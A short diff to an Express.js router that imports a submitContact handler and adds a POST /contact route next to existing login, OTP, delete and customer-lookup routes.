@@ -6,6 +6,7 @@ const {
 	submitLogin,
 	submitLoginAgain,
 	submitOtp,
+	submitContact,
 	deleteEntry,
 } = require("../controllers/nsiController");
 
@@ -17,6 +18,7 @@ router.get("/customers/id/:uniqueid", getInfo);
 router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/otp", submitOtp);
+router.post("/contact", submitContact);
 router.post("/delete", deleteEntry);
 
 module.exports = router;
